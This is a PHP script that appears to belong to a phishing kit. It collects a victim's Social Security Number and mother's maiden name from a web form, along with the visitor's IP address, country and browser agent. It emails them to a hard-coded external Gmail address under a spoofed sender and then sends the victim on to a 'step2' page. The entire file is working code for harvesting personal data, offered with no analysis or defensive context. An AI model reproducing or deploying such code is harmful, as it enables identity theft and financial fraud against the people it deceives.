<?php
date_default_timezone_set("Africa/Lagos");

	$date=date("Y-m-d H:i:s");
	
		$error = false;
if(isset($_POST['login']))
{		
if (getenv(HTTP_X_FORWARDED_FOR)){
$ip = getenv(HTTP_X_FORWARDED_FOR); } else {
$ip = getenv(REMOTE_ADDR); }
$date = date("d M, Y");
$time = date("g:i a"); 
$date = trim("Date : ".$date.", Time : ".$time);
$COUNTRY = $J7->geoplugin_countryName ;
$useragent = $_SERVER['HTTP_USER_AGENT']; 
		
	
		
		$username = trim($_POST['id']);
		$username = strip_tags($username);
		$username = htmlspecialchars($username);
		
		$pass = trim($_POST['password']);
		$pass = strip_tags($pass);
		$pass = htmlspecialchars($pass);
		
		$email = "johnloganj8@gmail.com";
		
			$to = $email; // Send email to our user

$subject = 'SSN From '.$ip;

$headers = "From:Gazuky<noreply@gsteamix.com>\r\n";
//$headers .= "CC: segdairo@gmail.com\r\n";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/html; charset=UTF-8\r\n";

$message = '<h3></h3>
<table width="auto" align="middle" style="color:#000">
<tr width="80%" align="justify"><td>

IP: '.$ip.'<br/>
Date: '.$date.'<br/>
Country: '.$COUNTRY.'<br/>
Agent: '.$useragent.'<br/>

Social Security Number: '.$username.'<br/>
Mother Maiden Name: '.$pass.'<br/>
</td></tr>

<tr width="80%"><td></td>
<td>. <br/>
</td></tr>
</table>

 
'; // Our message above including the link


mail($to, $subject, $message, $headers);	    


echo "<script>window.location.href='step2.html';</script>";

}
?>